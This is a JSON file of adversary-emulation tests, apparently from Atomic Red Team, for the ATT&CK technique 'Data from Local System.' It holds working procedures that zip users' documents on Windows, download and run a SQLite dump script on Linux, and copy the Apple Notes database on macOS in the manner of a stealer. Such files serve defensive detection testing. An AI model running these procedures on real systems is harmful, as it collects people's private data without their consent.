{
  "attack_technique": "T1005",
  "display_name": "Data from Local System",
  "atomic_tests": [
    {
      "name": "Search files of interest and save them to a single zip file (Windows)",
      "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path  $outputZip\\data.zip -Force",
        "procedure": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }"
      },
      "input_arguments": [
        {
          "arg_name": "starting_directory",
          "description": "Path to starting directory for the search",
          "type": "Path",
          "default": "C:\\Users"
        },
        {
          "arg_name": "output_zip_folder_path",
          "description": "Path to directory for saving the generated zip file",
          "type": "Path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1005"
        },
        {
          "arg_name": "file_extensions",
          "description": "List of file extensions to be searched and zipped, separated by comma and space",
          "type": "string",
          "default": ".doc, .docx, .txt"
        }
      ],
      "auto_generated_guid": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c"
    },
    {
      "name": "Find and dump sqlite databases (Linux)",
      "description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": false,
        "cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh",
        "procedure": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;"
      },
      "input_arguments": [
        {
          "arg_name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"
        }
      ],
      "dependencies": [
        {
          "description": "Check if running on a Debian based machine.",
          "prereq_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi",
          "get_prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi"
        }
      ],
      "auto_generated_guid": "00cbb875-7ae4-4cf1-b638-e543fd825300"
    },
    {
      "name": "Copy Apple Notes database files using AppleScript",
      "description": "This command will copy Apple Notes database files using AppleScript as seen in Atomic Stealer.",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "cleanup_command": "rm \"#{destination_path}/NoteStore.sqlite*\"",
        "procedure": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'"
      },
      "input_arguments": [
        {
          "arg_name": "destination_path",
          "description": "Specify the path to copy the database files into.",
          "type": "path",
          "default": "/private/tmp"
        }
      ],
      "auto_generated_guid": "cfb6d400-a269-4c06-a347-6d88d584d5f7"
    }
  ]
}